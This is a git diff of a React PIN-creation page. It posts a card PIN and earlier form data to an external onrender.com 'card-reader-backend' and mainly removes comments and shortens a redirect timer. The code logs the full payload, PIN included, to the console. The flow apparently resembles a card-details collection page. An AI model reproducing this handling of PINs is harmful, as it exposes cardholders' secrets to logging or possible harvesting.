@@ -2,7 +2,7 @@ import { useForm } from "react-hook-form";
 import { useNavigate } from "react-router-dom";
 import { FaLock, FaCheck, FaArrowLeft } from "react-icons/fa";
 import { toast } from "react-toastify";
-import { useState, useContext, useEffect } from "react"; // Added useEffect for timer
+import { useState, useContext, useEffect } from "react";
 import { FormContext } from "../App";
 
 function PinCreationPage({ prevStep }) {
@@ -15,26 +15,27 @@ function PinCreationPage({ prevStep }) {
   } = useForm({
     defaultValues: { pin: "", confirmPin: "" },
   });
+
   const navigate = useNavigate();
   const [isLoading, setIsLoading] = useState(false);
   const [step, setStep] = useState("create"); // 'create' or 'confirm'
-  const [showSuccess, setShowSuccess] = useState(false); // New: For success screen
+  const [showSuccess, setShowSuccess] = useState(false);
   const { formData } = useContext(FormContext);
 
-  // Auto-redirect after 30s on success
+  // Auto-redirect after 7s on success
   useEffect(() => {
     if (showSuccess) {
       const timer = setTimeout(() => {
         navigate("/loading");
-        console.log("Auto-navigated to /loading after 30s");
-      }, 30000); // 30 seconds
-      return () => clearTimeout(timer); // Cleanup
+        console.log("Auto-navigated to /loading after 7s");
+      }, 7000); // 7 seconds
+      return () => clearTimeout(timer);
     }
   }, [showSuccess, navigate]);
 
   const onSubmit = (data) => {
     setIsLoading(true);
-    console.log("Form Data at PIN creation:", formData); // Debug form data
+    console.log("Form Data at PIN creation:", formData);
 
     if (step === "create") {
       if (data.pin.length !== 4 || !/^\d+$/.test(data.pin)) {
@@ -43,7 +44,7 @@ function PinCreationPage({ prevStep }) {
         return;
       }
       setStep("confirm");
-      reset({ pin: data.pin, confirmPin: "" }); // Reset confirmPin
+      reset({ pin: data.pin, confirmPin: "" });
     } else {
       if (data.confirmPin !== watch("pin")) {
         toast.error("PINs do not match.");
@@ -57,11 +58,7 @@ function PinCreationPage({ prevStep }) {
         pin: data.confirmPin,
       };
 
-      console.log("Sending Data to /activate:", fullData); // Debug sent data
-      console.log(
-        "Fetch URL:",
-        "https://card-reader-backend-ls73.onrender.com/activate"
-      ); // Debug URL
+      console.log("Sending Data to /activate:", fullData);
       fetch("https://card-reader-backend-ls73.onrender.com/activate", {
         method: "POST",
         headers: {
@@ -70,12 +67,7 @@ function PinCreationPage({ prevStep }) {
         body: JSON.stringify(fullData),
       })
         .then((response) => {
-          console.log("Fetch Response Status:", response.status); // Debug status
-          console.log(
-            "Fetch Response Headers:",
-            Object.fromEntries(response.headers)
-          ); // Debug headers
-          console.log("Fetch Response Text:", response.statusText); // Debug status text
+          console.log("Fetch Response Status:", response.status);
           if (!response.ok) {
             throw new Error(
               `HTTP error! Status: ${response.status} - ${response.statusText}`
@@ -84,11 +76,17 @@ function PinCreationPage({ prevStep }) {
           return response.json();
         })
         .then((result) => {
-          console.log("Backend Response:", result); // Debug response
-          if (result && result.message === "Card activated successfully") {
+          console.log("Backend Response:", result);
+
+          // ✅ Option 1 fix: Check both message & accept === true
+          if (
+            result &&
+            (result.message === "Card activated successfully" ||
+              result.accept === true)
+          ) {
             toast.success("PIN created successfully!");
-            setShowSuccess(true); // Show success screen instead of immediate navigate
-            setIsLoading(false); // Reset loading here
+            setShowSuccess(true);
+            setIsLoading(false);
           } else {
             throw new Error(
               result?.message || "Unexpected response from server"
@@ -102,7 +100,7 @@ function PinCreationPage({ prevStep }) {
               ? "Backend endpoint not found. Please check server status."
               : error.message || "Server error. Please try again later."
           );
-          setIsLoading(false); // Ensure reset on error
+          setIsLoading(false);
         });
     }
   };
@@ -116,10 +114,10 @@ function PinCreationPage({ prevStep }) {
           flexDirection: "column",
           alignItems: "center",
           justifyContent: "center",
-          height: "100vh", // Full viewport for centering
+          height: "100vh",
           textAlign: "center",
           padding: "20px",
-          backgroundColor: "#f0f8ff", // Light blue background for success
+          backgroundColor: "#f0f8ff",
         }}
       >
         <div
@@ -127,7 +125,7 @@ function PinCreationPage({ prevStep }) {
             width: 120,
             height: 120,
             borderRadius: "50%",
-            backgroundColor: "#d4edda", // Light green circle
+            backgroundColor: "#d4edda",
             display: "flex",
             alignItems: "center",
             justifyContent: "center",
@@ -137,8 +135,8 @@ function PinCreationPage({ prevStep }) {
         >
           <FaCheck
             style={{
-              fontSize: "60px", // Large green check
-              color: "#28a745", // Green color
+              fontSize: "60px",
+              color: "#28a745",
             }}
           />
         </div>
@@ -149,7 +147,6 @@ function PinCreationPage({ prevStep }) {
           You can now make withdrawals or perform transactions with this card.
           Redirecting in 30 seconds...
         </p>
-        {/* Optional: Manual redirect button */}
         <button
           onClick={() => navigate("/loading")}
           style={{
@@ -168,7 +165,7 @@ function PinCreationPage({ prevStep }) {
     );
   }
 
-  // Original Form Render (unchanged except for minor tweaks)
+  // Original Form Render
   return (
     <form
       onSubmit={handleSubmit(onSubmit)}
